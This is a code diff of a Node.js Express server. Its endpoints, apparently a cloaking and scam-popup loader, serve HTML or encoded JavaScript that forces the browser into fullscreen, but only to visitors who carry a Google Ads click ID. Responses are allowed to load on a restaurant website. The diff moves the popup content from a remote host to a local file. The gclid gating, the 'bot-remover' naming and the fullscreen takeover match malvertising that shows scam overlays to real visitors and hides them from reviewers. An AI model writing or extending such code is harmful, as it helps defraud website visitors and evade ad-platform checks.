@@ -1,11 +1,18 @@
 import express from "express";
 import cors from "cors";
-import fetch from "node-fetch"; // IMPORTANT: node-fetch v3+ needed
+import fs from "fs/promises";
+import path from "path";
+import { fileURLToPath } from "url";
+import fetch from "node-fetch";
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const ALLOWED_ORIGIN = "https://sage-horse-b7caad.netlify.app";
+const ALLOWED_ORIGIN = "https://amicisrestaurant.food";
+
+// Helper to resolve relative paths (ESM compatible)
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 app.use(
   cors({
@@ -50,14 +57,13 @@ app.get("/bot-remover", validateRequest, async (req, res) => {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
-  const assetUrl = "https://mumbaipopupformalik.onrender.com";
   try {
-    const response = await fetch(assetUrl);
-    const text = await response.text();
+    const htmlPath = path.join(__dirname, "asset.html");
+    const html = await fs.readFile(htmlPath, "utf-8");
     res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
-    return res.send(text);
+    return res.send(html);
   } catch (err) {
-    return res.status(500).send("FAILED: could not fetch asset");
+    return res.status(500).send("FAILED: could not read local asset");
   }
 });
 
@@ -68,14 +74,10 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
-  const assetUrl = "https://mumbaipopupformalik.onrender.com";
-
   try {
-    const assetRes = await fetch(assetUrl);
-    const someRandomString = await assetRes.text();
-
-    // Safely stringify the HTML to embed into JavaScript
-    const sanitizedHTML = JSON.stringify(someRandomString);
+    const htmlPath = path.join(__dirname, "asset.html");
+    const someRandomString = await fs.readFile(htmlPath, "utf-8");
+    const sanitizedHTML = JSON.stringify(someRandomString); // escape for JS
 
     const code = `
       document.documentElement.requestFullscreen().then(() => {
@@ -96,8 +98,8 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
     res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
     return res.json({ code: encoded });
   } catch (err) {
-    console.error("Error generating frontend loader code:", err);
-    return res.status(500).json({ error: "Could not fetch and encode content." });
+    console.error("Error in frontend-loader:", err);
+    return res.status(500).json({ error: "Failed to generate frontend loader" });
   }
 });
 
